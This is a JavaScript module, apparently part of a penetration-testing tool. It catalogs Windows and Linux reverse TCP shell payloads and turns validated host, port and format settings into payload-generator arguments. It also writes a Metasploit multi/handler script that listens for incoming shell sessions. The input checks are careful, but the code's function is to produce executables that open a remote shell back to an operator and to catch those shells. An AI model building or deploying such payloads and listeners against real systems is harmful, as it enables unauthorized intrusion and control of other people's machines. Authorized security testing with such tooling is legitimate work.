// Shared catalog. Only these reviewed modules and formats become compiler arguments.
export const PAYLOAD_TEMPLATES = [
  { id: 'windows-x64', name: 'Windows x64 reverse TCP shell', module: 'windows/x64/shell_reverse_tcp', platform: 'Windows', arch: 'x64', formats: ['exe', 'raw'] },
  { id: 'windows-x86', name: 'Windows x86 reverse TCP shell', module: 'windows/shell_reverse_tcp', platform: 'Windows', arch: 'x86', formats: ['exe', 'raw'] },
  { id: 'linux-x64', name: 'Linux x64 reverse TCP shell', module: 'linux/x64/shell_reverse_tcp', platform: 'Linux', arch: 'x64', formats: ['elf', 'raw'] },
  { id: 'linux-x86', name: 'Linux x86 reverse TCP shell', module: 'linux/x86/shell_reverse_tcp', platform: 'Linux', arch: 'x86', formats: ['elf', 'raw'] },
]

export function buildPayloadRequest(input) {
  if (!input || typeof input !== 'object' || Array.isArray(input)) throw new Error('Payload settings are required.')
  if (Object.keys(input).some(key => !['template', 'format', 'host', 'port'].includes(key))) throw new Error('Unknown payload setting.')
  const template = PAYLOAD_TEMPLATES.find(item => item.id === input.template)
  if (!template || !template.formats.includes(input.format)) throw new Error('Select a supported payload and output format.')
  const host = typeof input.host === 'string' ? input.host.trim() : ''
  const ipv4 = host.split('.')
  const numericHost = /^[0-9.]+$/.test(host)
  const validIp = ipv4.length === 4 && ipv4.every(part => /^(0|[1-9][0-9]{0,2})$/.test(part) && Number(part) <= 255)
  const validName = host.length <= 253 && host.split('.').every(part => /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$/.test(part))
  if (!host || (numericHost ? !validIp : !validName)) throw new Error('Callback host must be an IPv4 address or hostname (no URLs or commands).')
  const port = typeof input.port === 'number' ? input.port : typeof input.port === 'string' && /^[0-9]{1,5}$/.test(input.port) ? Number(input.port) : NaN
  if (!Number.isInteger(port) || port < 1 || port > 65535) throw new Error('Callback port must be between 1 and 65535.')
  return {
    template, host, port, format: input.format,
    args: ['-p', template.module, `LHOST=${host}`, `LPORT=${port}`, '-f', input.format],
    handler: `use exploit/multi/handler\nset PAYLOAD ${template.module}\nset LHOST ${host}\nset LPORT ${port}\nset ExitOnSession false\nexploit -j\n`,
  }
}
